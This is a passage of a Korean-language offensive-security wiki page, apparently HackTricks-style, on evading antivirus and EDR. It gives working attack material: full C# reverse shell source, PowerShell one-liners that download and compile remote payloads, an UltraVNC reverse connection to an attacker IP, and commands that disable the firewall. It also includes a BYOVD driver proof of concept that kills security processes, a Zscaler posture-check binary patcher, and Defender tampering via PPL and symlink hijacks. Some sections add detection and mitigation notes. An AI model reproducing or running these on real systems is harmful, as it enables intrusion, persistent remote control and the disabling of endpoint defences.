페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 프로세스 전체에 대해 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(silver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법에는 여러 가지가 있습니다:

- **Fork\&Run**

새로운 희생 프로세스를 **생성(spawn)** 하고, 그 새 프로세스에 포스트-익스플로잇 악성 코드를 인젝션한 후 실행하고 작업이 끝나면 해당 프로세스를 종료하는 방식입니다. 장단점이 모두 있습니다. Fork and Run 방식의 장점은 실행이 우리의 Beacon implant 프로세스 **외부에서** 발생한다는 점입니다. 이는 포스트-익스플로잇 작업에서 무언가 잘못되거나 탐지되더라도 우리의 **implant가 살아남을 가능성**이 훨씬 높다는 것을 의미합니다. 단점은 **Behavioural Detections**에 걸릴 가능성이 더 커진다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

자신의 프로세스에 포스트-익스플로잇 악성 코드를 **인젝션**하는 방식입니다. 이렇게 하면 새 프로세스를 생성하여 AV에 스캔되는 것을 피할 수 있지만, 페이로드 실행 중 문제가 발생하면 프로세스가 충돌하여 **beacon을 잃을 가능성**이 훨씬 커진다는 단점이 있습니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글을 참고하세요: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 그리고 그들의 InlineExecute-Assembly BOF(레포): ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell에서 C# Assemblies를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 동영상](https://www.youtube.com/watch?v=oe11Q-3Akuk)을 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안된 것처럼, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 침해된 머신이 접근할 수 있도록 하면 다른 언어를 사용해 악성 코드를 실행할 수 있습니다.

SMB 공유의 Interpreter Binaries와 환경에 접근을 허용하면 해당 머신의 메모리 내에서 이러한 언어들로 **임의 코드를 실행**할 수 있습니다.

레포에 따르면: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 이용하면 **정적 시그니처를 우회할 수 있는 유연성**이 더 생깁니다. 이러한 언어들의 난독화되지 않은 리버스 쉘 스크립트로 테스트한 결과 성공 사례가 있었습니다.

## TokenStomping

Token stomping은 공격자가 액세스 토큰이나 EDR 또는 AV 같은 보안 제품과 관련된 토큰을 **조작**하여 권한을 낮춤으로써 프로세스가 종료되지는 않지만 악성 활동을 확인할 수 있는 권한을 잃게 하는 기법입니다.

이를 방지하기 위해 Windows는 보안 프로세스의 토큰에 대해 외부 프로세스가 핸들을 얻지 못하도록 할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**이 블로그 포스트**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에 설명된 것처럼, 피해자 PC에 Chrome Remote Desktop을 배포하고 이를 통해 원격 제어 및 영구화(persistence)를 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭하여 다운로드합니다.
2. 피해자 측에서 (관리자 권한 필요) 설치 프로그램을 무음 설치: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가서 Next를 클릭합니다. 마법사가 권한 부여를 요청하면 Authorize 버튼을 클릭해 계속합니다.
4. 약간 조정하여 제시된 매개변수를 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (참고: pin 파라미터를 통해 GUI를 사용하지 않고도 PIN을 설정할 수 있습니다.)

## Advanced Evasion

회피는 매우 복잡한 주제입니다. 하나의 시스템 내에서도 다양한 텔레메트리 소스를 고려해야 할 때가 많아, 성숙한 환경에서는 완전히 탐지되지 않는 상태를 유지하는 것이 사실상 불가능한 경우가 많습니다.

공격 대상 환경마다 강점과 약점이 각각 다릅니다.

더 고급 회피 기법에 대한 실마리를 얻고 싶다면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 발표를 꼭 보시길 권합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

다음은 [@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 관한 또 다른 훌륭한 발표입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 바이너리의 일부를 **점진적으로 제거**하면서 Defender가 어떤 부분을 악성으로 판단하는지 찾아내어 분리해 줍니다.\
동일한 기능을 제공하는 또 다른 도구는 [**avred**](https://github.com/dobin/avred)이며, 공개 웹 서비스는 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 이용할 수 있습니다.

### **Telnet Server**

Windows10 이전까지 모든 Windows에는 관리자로 설치할 수 있는 **Telnet server**가 기본적으로 포함되어 있었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 자동으로 **시작**되도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치형(setup)이 아닌 bin 다운로드를 선택하세요)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** To maintain stealth you must not do a few things

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 **start the lister**를 `msfconsole -r file.rc`로 시작하고, **execute** the **xml payload**를 다음과 같이 실행하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 자체 reverse shell 컴파일

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 빌드 인젝터 예제 (Python 사용):

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 더보기

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 커널 공간에서 AV/EDR 무력화

Storm-2603은 랜섬웨어를 풀기 전에 엔드포인트 보호를 비활성화하기 위해 **Antivirus Terminator**라는 작은 콘솔 유틸리티를 사용했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버를 포함**하고 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 실행합니다.

주요 요점
1. **Signed driver**: 디스크에 배달된 파일은 `ServiceMouse.sys`이지만, 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화된 경우에도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **kernel service**로 등록하고, 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 user land에서 접근 가능하도록 만듭니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 사용자 모드 보호를 완전히 우회합니다. 커널에서 실행되는 코드는 *protected* 프로세스를 열거나 종료하거나 PPL/PP, ELAM 등 다른 하드닝 기능과 관계없이 커널 객체를 조작할 수 있습니다.

Detection / Mitigation
•  Windows가 `AToolsKrnl64.sys`의 로드를 거부하도록 Microsoft의 vulnerable-driver 차단 목록(`HVCI`, `Smart App Control`)을 활성화합니다.  
•  새로운 *kernel* 서비스 생성 여부를 모니터링하고, 드라이버가 world-writable 디렉터리에서 로드되거나 허용 목록에 없는 경우 경고합니다.  
•  사용자 모드에서 커스텀 device 객체에 대한 핸들이 생성된 후 의심스러운 `DeviceIoControl` 호출이 발생하는지 주시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 상태 규칙(device-posture rules)을 로컬에서 적용하며 결과를 다른 구성요소에 전달하기 위해 Windows RPC에 의존합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가가 **완전히 클라이언트 측에서** 이루어집니다(서버에는 boolean 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행파일이 **Zscaler에 의해 서명되었는지**(`WinVerifyTrust`를 통해)만 검증합니다.

디스크의 서명된 바이너리 네 개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 검사에 대해 compliant 처리 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 어떤 프로세스(심지어 unsigned)도 RPC 파이프에 바인드 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체 |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 단축 처리되어 무시됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks display **green/compliant**.
* 서명되지 않았거나 변조된 바이너리가 named-pipe RPC 엔드포인트를 열 수 있다 (예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 침해된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 대한 무제한 접근 권한을 획득한다.

이 사례 연구는 순수하게 클라이언트 측의 신뢰 결정과 단순한 서명 검사가 몇 바이트 패치로 어떻게 무너질 수 있는지를 보여준다.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL)는 서명자/레벨 계층을 적용하여 동일하거나 더 높은 레벨의 protected 프로세스만 서로를 변조할 수 있도록 한다. 공격적으로 보면, 합법적으로 PPL-enabled 바이너리를 실행하고 그 인자를 제어할 수 있다면, 정상적인 기능(예: logging)을 AV/EDR에서 사용하는 보호된 디렉터리에 대해 제약된 PPL 기반의 쓰기 프리미티브로 전환할 수 있다.

What makes a process run as PPL
- 대상 EXE(및 로드된 모든 DLLs)는 PPL-capable EKU로 서명되어야 한다.
- 프로세스는 CreateProcess로 생성되어야 하며 플래그를 사용해야 한다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 바이너리의 서명자와 일치하는 호환 가능한 protection level을 요청해야 한다(예: anti-malware 서명자용 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자용 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패한다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe` 는 자체적으로 프로세스를 생성하며 호출자가 지정한 경로에 로그 파일을 쓰기 위한 파라미터를 받습니다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL 보호 하에서 수행됩니다.
- ClipUp은 공백이 포함된 경로를 파싱할 수 없습니다; 일반적으로 보호된 위치를 가리킬 때는 8.3 short paths를 사용하세요.

8.3 짧은 경로 도움말
- 짧은 이름 나열: 각 상위 디렉토리에서 `dir /x` 실행.
- cmd에서 짧은 경로 유도: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

악용 체인(개요)
1) PPL을 지원하는 LOLBIN(ClipUp)을 런처(예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`와 함께 실행합니다.
2) ClipUp의 로그 경로 인자를 전달해 보호된 AV 디렉토리(예: Defender Platform)에 파일 생성을 강제합니다. 필요한 경우 8.3 short names를 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 열려 있거나 잠겨 있는 경우(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 이루어지도록 더 일찍 실행되는 자동 시작 서비스(auto-start service)를 설치해 스케줄하세요. Process Monitor(boot logging)로 부팅 순서를 검증하세요.
4) 재부팅 시 PPL로 보호된 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

예시 실행(경로는 안전을 위해 일부 삭제/단축됨):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
참고 및 제약
- ClipUp이 쓰는 내용은 위치 제어 외에는 제어할 수 없습니다; 이 primitive는 정밀한 콘텐츠 주입보다는 손상(corruption)에 적합합니다.
- 서비스를 설치/시작하고 재부팅 창이 필요하므로 로컬 Administrator/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있지 않아야 하며, 부팅 시 실행하면 파일 잠금을 피할 수 있습니다.

탐지
- 부팅 전후에 비정상적인 인수로 `ClipUp.exe`가 생성되거나 비표준 런처(parented by non-standard launchers)에 의해 부모 프로세스가 설정되는 프로세스 생성.
- 자동 시작으로 구성된 새로운 서비스가 의심스러운 바이너리를 지정하고 Defender/AV보다 항상 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 활동을 조사하세요.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링; protected-process 플래그를 가진 프로세스에 의한 예상치 못한 파일 생성/수정.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 비-AV 바이너리의 비정상적인 PPL 레벨 사용을 모니터링하세요.

완화
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있는지와 어떤 부모 아래에서 실행될 수 있는지를 제한하세요; 정당한 컨텍스트 밖에서의 ClipUp 호출을 차단하세요.
- 서비스 위생: 자동 시작 서비스의 생성/수정을 제한하고 시작 순서 조작을 모니터링하세요.
- Defender tamper protection 및 early-launch 보호 기능을 활성화하세요; 바이너리 손상을 나타내는 시작 오류를 조사하세요.
- 보안 도구를 호스팅하는 볼륨에서 8.3 short-name 생성 비활성화를 고려하세요(환경과 호환되는 경우, 철저히 테스트 필요).

PPL 및 도구 관련 참조
- Microsoft Protected Processes 개요: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 참조: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon 부팅 로깅(순서 검증): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- 기법 설명 (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로 아래의 하위 폴더를 열거하여 실행할 플랫폼을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 사전식(lexicographic)으로 큰 버전 문자열(예: `4.18.25070.5-0`)을 가진 하위 폴더를 선택한 다음, 해당 위치에서 Defender 서비스 프로세스를 시작합니다(서비스/레지스트리 경로도 그에 맞게 업데이트됨). 이 선택은 디렉터리 엔트리, 디렉터리 재파싱 포인트(reparse points, symlinks)를 신뢰합니다. 관리자는 이를 이용해 Defender를 공격자가 쓰기 가능한 경로로 리디렉션하여 DLL sideloading 또는 서비스 중단을 유발할 수 있습니다.

전제 조건
- 로컬 Administrator(Platform 폴더 아래에 디렉터리/심링크를 생성하려면 필요)
- 재부팅 또는 Defender 플랫폼 재선택을 유발할 수 있는 능력(부팅 시 서비스 재시작)
- 내장 도구만 필요 (mklink)

작동 원리
- Defender는 자체 폴더에 대한 쓰기를 차단하지만, 플랫폼 선택은 디렉터리 엔트리를 신뢰하고 대상이 보호되거나 신뢰된 경로로 해석되는지 검증하지 않고 사전식으로 가장 큰 버전을 선택합니다.

단계별 (예시)
1) 현재 platform 폴더의 쓰기 가능한 복제본을 준비합니다(예: `C:\TMP\AV`):
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 자신의 폴더를 가리키는 상위 버전 디렉터리 symlink를 생성하세요:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 생성되고, 서비스 구성/레지스트리에 해당 위치가 반영되는 것을 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 애플리케이션 디렉터리에서 로드하는 DLL을 배치/교체하여 Defender의 프로세스에서 코드를 실행할 수 있습니다. 자세한 내용은 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink을 제거하면 다음 시작 시 구성된 경로가 해석되지 않아 Defender가 시작에 실패합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기법은 자체만으로 권한 상승을 제공하지 않으며, 관리자 권한이 필요합니다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

레드 팀은 Import Address Table (IAT)를 후킹하고 선택된 APIs를 공격자 제어의 position‑independent code (PIC)를 통해 라우팅함으로써 런타임 회피를 C2 임플란트에서 타깃 모듈 자체로 이동시킬 수 있습니다. 이 방법은 많은 키트가 노출하는 작은 API 표면(예: CreateProcessA)을 넘어서 회피를 일반화하고, 동일한 보호를 BOFs 및 post‑exploitation DLLs로 확장합니다.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- 호스트 DLL이 로드될 때 IMAGE_IMPORT_DESCRIPTOR를 순회하여 대상 임포트(예: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc)에 대한 IAT 엔트리를 얇은 PIC 래퍼를 가리키도록 패치합니다.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - 호출 전후 메모리 마스크/언마스크(예: beacon 영역 암호화, RWX→RX, 페이지 이름/권한 변경)를 수행한 뒤 호출 후 복원합니다.
  - Call‑stack spoofing: 정상적인 스택을 구성하고 타깃 API로 전환하여 콜 스택 분석이 예상된 프레임들로 해석되도록 합니다.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- 툴 코드를 수정하거나 Beacon이 특정 API를 프록시하도록 의존하지 않고도, 후킹된 임포트를 사용하는 모든 코드에서 동작합니다.
- post‑ex DLLs를 포함합니다: LoadLibrary*를 후킹하면 모듈 로드를 가로채(e.g., System.Management.Automation.dll, clr.dll) 그들의 API 호출에 동일한 마스킹/스택 회피를 적용할 수 있습니다.
- CreateProcessA/W를 래핑하여 콜 스택 기반 탐지에 대해 프로세스 생성형 post‑ex 명령의 신뢰할 수 있는 사용을 복원합니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
